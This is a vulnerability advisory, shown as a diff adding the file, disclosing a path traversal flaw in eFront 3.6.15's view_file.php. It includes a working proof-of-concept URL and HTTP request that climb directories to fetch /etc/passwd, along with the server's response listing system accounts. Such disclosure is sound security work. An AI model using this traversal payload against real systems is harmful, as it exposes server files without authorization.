@@ -1,0 +1,70 @@
+eFront 3.6.15 Path Traversal Vulnerability
+
+[+] Author: Filippo Roncari
+[+] Target: eFront 
+[+] Version: 3.6.15 and probably lower
+[+] Vendor: www.efrontlearning.net
+[+] Accessibility: Remote
+[+] Severity: High
+[+] CVE: <requested>
+[+] Full Advisory: https://www.securenetwork.it/docs/advisory/SN-15-02_eFront.pdf
+[+] Info: f.roncari@securenetwork.it 
+
+
+[+] Summary
+eFront is an open source Learning Management System (LMS) used to create and manage online training courses. From Wikipedia: “eFront is designed to assist with the creation of online learning communities while offering various opportunities for collaboration and interaction through an icon-based user interface. The platform offers tools for content creation, tests building, assignments management, reporting, internal messaging, forum, chat, surveys, calendar and others”. 
+
+
+[+] Vulnerability Details
+eFront 3.6.15 is prone to a critical path traversal vulnerability involving the view_file.php module, due to improper user-input sanitization and unsafe inner normalize() function logic. Any unprivilieged attacker could exploit this vulnerability by manipulating HTTP parameter value in order to climb the directories tree and access arbitrary files on the remote file system. This issue can lead to critical confidentiality violations, depending on the privileges assigned to the application server.
+
+
+[+] Technical Details
+View full advisory at https://www.securenetwork.it/docs/advisory/SN-15-02_eFront.pdf for technical details and source code.
+
+
+[+] Proof of Concept (PoC)
+
+	[!] PoC URL
+	-----------------------------
+	http://target.site/www/view_file.php?action=download&file=/[EFRONT_BASE_PATH]/../../../../../../etc/passwd/
+	_____________________________
+
+	[!] HTTP Request
+	-----------------------------
+	GET /test/efront/www/view_file.php?action=download&file=/Applications/MAMP/htdocs/test/efront/../../../../../etc/passwd/ HTTP/1.1
+	Host: localhost
+	Cookie: display_all_courses=1; PHPSESSID=d36bed784e063e65cf31721f8ec7a0bd; SQLiteManager_currentLangue=6;
+	PHPSESSID=d36bed784e063e65cf31721f8ec7a0bd; parent_sid=d36bed784e063e65cf31721f8ec7a0bd
+	-----------------------------
+
+	[!] HTTP Response
+	-----------------------------
+	HTTP/1.1 200 OK
+	Date: Mon, 30 Mar 2015 13:20:43 GMT Content-Description: File Transfer
+	Content-Disposition: attachment; filename="passwd" Content-Transfer-Encoding: binary
+	Expires: 0
+	Cache-Control: must-revalidate, post-check=0, pre-check=0 Pragma: public
+	Content-Length: 5253
+	Content-Type: application/download
+
+	##
+	# User Database #
+	# Note that this file is consulted directly only when the system is running
+	# in single-user mode. At other times this information is provided by
+	# Open Directory. #
+	# See the opendirectoryd(8) man page for additional information about
+	# Open Directory.
+	##
+	nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh
+	daemon:*:1:1:System Services:/var/root:/usr/bin/false
+	_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico _taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false _networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false
+
+	[...]
+	_____________________________
+
+For technical details and explanations check the full advisory.	
+
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this alert, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
